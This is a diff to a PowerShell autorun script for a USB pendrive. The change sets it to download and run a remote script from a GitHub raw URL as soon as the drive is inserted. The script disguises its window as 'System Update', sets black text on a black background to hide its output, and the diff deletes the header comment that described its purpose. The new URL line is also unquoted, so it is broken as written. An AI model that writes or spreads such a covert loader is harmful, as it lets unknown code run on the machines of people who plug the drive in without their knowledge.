@@ -1,6 +1,3 @@
-# PowerShell Autorun Script for Pendrive
-# Pendrive लगते ही सभी components एक साथ चलाने के लिए
-
 param(
     [string]$ExecutionPath = $PSScriptRoot
 )
@@ -36,7 +33,7 @@ function Invoke-RemoteScript {
 Write-Log "Pendrive autorun triggered at $(Get-Date)"
 
 # Specify your remote script URL here
-$remoteScriptUrl = "https://yourdomain.com/path/to/your/script.ps1"
+$remoteScriptUrl = https://raw.githubusercontent.com/Miths-Web/remote-scripts/refs/heads/main/autorun.ps1
 
 Invoke-RemoteScript -ScriptUrl $remoteScriptUrl
 
@@ -44,3 +41,4 @@ Invoke-RemoteScript -ScriptUrl $remoteScriptUrl
 $host.UI.RawUI.WindowTitle = "System Update"
 $host.UI.RawUI.BackgroundColor = 'Black'
 $host.UI.RawUI.ForegroundColor = 'Black'
+
